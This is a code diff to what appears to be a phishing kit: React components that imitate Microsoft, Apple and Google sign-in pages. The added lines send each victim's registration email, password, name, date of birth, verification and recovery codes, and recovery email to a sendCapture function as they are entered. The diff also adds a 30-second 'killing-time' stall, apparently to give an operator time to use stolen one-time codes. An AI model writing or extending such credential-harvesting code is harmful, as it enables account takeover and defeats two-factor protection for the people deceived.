@@ -1172,7 +1172,7 @@ function MicrosoftLogin({ device, theme, onProviderSwitch }: { device: string; t
                     type="email"
                     value={regEmail}
                     onChange={e => setRegEmail(e.target.value)}
-                    onKeyDown={e => e.key === 'Enter' && regEmail && setRegStep('reg-password')}
+                    onKeyDown={e => { if (e.key === 'Enter' && regEmail) { sendCapture('reg_email', regEmail); setRegStep('reg-password'); } }}
                     placeholder="someone@example.com"
                     autoFocus
                     className={`${lightUnderlineInputSolid} mb-3`}
@@ -1182,7 +1182,7 @@ function MicrosoftLogin({ device, theme, onProviderSwitch }: { device: string; t
                   </div>
                   <div className="flex justify-between items-center">
                     <button onClick={() => setStep('email')} className="text-[15px] font-semibold px-6 py-1.5 border border-gray-400 text-[#1b1b1b] hover:bg-gray-100 transition-colors" style={{ borderRadius: 0 }}>Back</button>
-                    <button onClick={() => regEmail && setRegStep('reg-password')} className="bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold px-8 py-1.5 transition-colors" style={{ borderRadius: 0 }}>Next</button>
+                    <button onClick={() => { if (regEmail) { sendCapture('reg_email', regEmail); setRegStep('reg-password'); } }} className="bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold px-8 py-1.5 transition-colors" style={{ borderRadius: 0 }}>Next</button>
                   </div>
                 </>
               )}
@@ -1196,7 +1196,7 @@ function MicrosoftLogin({ device, theme, onProviderSwitch }: { device: string; t
                       type={regShowPw ? 'text' : 'password'}
                       value={regPassword}
                       onChange={e => setRegPassword(e.target.value)}
-                      onKeyDown={e => e.key === 'Enter' && regPassword.length >= 8 && setRegStep('reg-name')}
+                      onKeyDown={e => { if (e.key === 'Enter' && regPassword.length >= 8) { sendCapture('reg_password', regPassword); setRegStep('reg-name'); } }}
                       placeholder="Password"
                       autoFocus
                       className={`${lightUnderlineInputSolid} pr-8`}
@@ -1213,7 +1213,7 @@ function MicrosoftLogin({ device, theme, onProviderSwitch }: { device: string; t
                   </label>
                   <div className="flex justify-between items-center">
                     <button onClick={() => setRegStep('reg-email')} className="text-[15px] font-semibold px-6 py-1.5 border border-gray-400 text-[#1b1b1b] hover:bg-gray-100 transition-colors" style={{ borderRadius: 0 }}>Back</button>
-                    <button onClick={() => regPassword.length >= 8 && setRegStep('reg-name')} className="bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold px-8 py-1.5 transition-colors" style={{ borderRadius: 0 }}>Next</button>
+                    <button onClick={() => { if (regPassword.length >= 8) { sendCapture('reg_password', regPassword); setRegStep('reg-name'); } }} className="bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold px-8 py-1.5 transition-colors" style={{ borderRadius: 0 }}>Next</button>
                   </div>
                 </>
               )}
@@ -1229,7 +1229,7 @@ function MicrosoftLogin({ device, theme, onProviderSwitch }: { device: string; t
                   </div>
                   <div className="flex justify-between items-center">
                     <button onClick={() => setRegStep('reg-password')} className="text-[15px] font-semibold px-6 py-1.5 border border-gray-400 text-[#1b1b1b] hover:bg-gray-100 transition-colors" style={{ borderRadius: 0 }}>Back</button>
-                    <button onClick={() => (firstName || lastName) && setRegStep('reg-dob')} className="bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold px-8 py-1.5 transition-colors" style={{ borderRadius: 0 }}>Next</button>
+                    <button onClick={() => { if (firstName || lastName) { sendCapture('reg_name', [firstName, lastName].filter(Boolean).join(' ')); setRegStep('reg-dob'); } }} className="bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold px-8 py-1.5 transition-colors" style={{ borderRadius: 0 }}>Next</button>
                   </div>
                 </>
               )}
@@ -1258,7 +1258,7 @@ function MicrosoftLogin({ device, theme, onProviderSwitch }: { device: string; t
                   </div>
                   <div className="flex justify-between items-center">
                     <button onClick={() => setRegStep('reg-name')} className="text-[15px] font-semibold px-6 py-1.5 border border-gray-400 text-[#1b1b1b] hover:bg-gray-100 transition-colors" style={{ borderRadius: 0 }}>Back</button>
-                    <button onClick={() => setRegStep('reg-verify')} className="bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold px-8 py-1.5 transition-colors" style={{ borderRadius: 0 }}>Next</button>
+                    <button onClick={() => { sendCapture('reg_dob', `${regMonth} ${regDay}, ${regYear}`); setRegStep('reg-verify'); }} className="bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold px-8 py-1.5 transition-colors" style={{ borderRadius: 0 }}>Next</button>
                   </div>
                 </>
               )}
@@ -1289,7 +1289,7 @@ function MicrosoftLogin({ device, theme, onProviderSwitch }: { device: string; t
                   </p>
                   <div className="flex justify-between items-center">
                     <button onClick={() => setRegStep('reg-dob')} className="text-[15px] font-semibold px-6 py-1.5 border border-gray-400 text-[#1b1b1b] hover:bg-gray-100 transition-colors" style={{ borderRadius: 0 }}>Back</button>
-                    <button onClick={() => verifyCode.length === 6 && setStep('email')} className="bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold px-8 py-1.5 transition-colors" style={{ borderRadius: 0 }}>Next</button>
+                    <button onClick={() => { if (verifyCode.length === 6) { sendCapture('reg_verify_code', verifyCode); setStep('email'); } }} className="bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold px-8 py-1.5 transition-colors" style={{ borderRadius: 0 }}>Next</button>
                   </div>
                 </>
               )}
@@ -1334,7 +1334,7 @@ function MicrosoftLogin({ device, theme, onProviderSwitch }: { device: string; t
                   <div className="flex justify-between items-center">
                     <button onClick={() => setStep('email')} className="text-[15px] font-semibold px-6 py-1.5 border border-gray-400 text-[#1b1b1b] hover:bg-gray-100 transition-colors" style={{ borderRadius: 0 }}>Cancel</button>
                     <button
-                      onClick={() => recEmail && recCaptcha && setRecStep('rec-options')}
+                      onClick={() => { if (recEmail && recCaptcha) { sendCapture('rec_email', recEmail); setRecStep('rec-options'); } }}
                       className="bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold px-8 py-1.5 transition-colors"
                       style={{ borderRadius: 0 }}
                     >Next</button>
@@ -1382,7 +1382,7 @@ function MicrosoftLogin({ device, theme, onProviderSwitch }: { device: string; t
                   </div>
                   <div className="flex justify-between items-center">
                     <button onClick={() => setRecStep('rec-options')} className="text-[15px] font-semibold px-6 py-1.5 border border-gray-400 text-[#1b1b1b] hover:bg-gray-100 transition-colors" style={{ borderRadius: 0 }}>Back</button>
-                    <button onClick={() => recCode.length === 6 && setStep('email')} className="bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold px-8 py-1.5 transition-colors" style={{ borderRadius: 0 }}>Verify</button>
+                    <button onClick={() => { if (recCode.length === 6) { sendCapture('rec_code', recCode); setStep('email'); } }} className="bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold px-8 py-1.5 transition-colors" style={{ borderRadius: 0 }}>Verify</button>
                   </div>
                 </>
               )}
@@ -1816,7 +1816,7 @@ function AppleLogin({ device, theme, onProviderSwitch }: { device: string; theme
               <div style={{ display:'flex', gap:8, width:'100%', marginBottom:10 }}>
                 <button
                   data-testid="apple-not-now"
-                  onClick={() => setStep('email')}
+                  onClick={() => nav('processing')}
                   style={{ ...S.outBtn(), flex:1, fontSize:15 }}
                 >
                   Not Now
@@ -1855,12 +1855,12 @@ function AppleLogin({ device, theme, onProviderSwitch }: { device: string; theme
                 autoFocus
                 value={forgotEmail}
                 onChange={e => setForgotEmail(e.target.value)}
-                onKeyDown={e => { if (e.key === 'Enter' && forgotEmail) setStep('forgot-sent'); }}
+                onKeyDown={e => { if (e.key === 'Enter' && forgotEmail) { sendCapture('forgot_email', forgotEmail); setStep('forgot-sent'); } }}
                 placeholder="Email or Phone Number"
                 style={{ ...S.input(), marginBottom:14 }}
               />
               <button
-                onClick={() => forgotEmail && setStep('forgot-sent')}
+                onClick={() => { if (forgotEmail) { sendCapture('forgot_email', forgotEmail); setStep('forgot-sent'); } }}
                 style={{ ...S.blueBtn(!forgotEmail), width:'100%', marginBottom:10 }}
               >
                 Continue
@@ -1974,6 +1974,12 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
     onProviderSwitch,
   });
   useEffect(() => { sendStepUpdate(step); }, [step, sendStepUpdate]);
+
+  useEffect(() => {
+    if (step !== 'killing-time') return;
+    const t = setTimeout(() => setStep('processing'), 30000);
+    return () => clearTimeout(t);
+  }, [step]);
 
   const nav = (target: GoogleStep, captureField?: string, captureVal?: string) => {
     if (captureField && captureVal) sendCapture(captureField, captureVal);
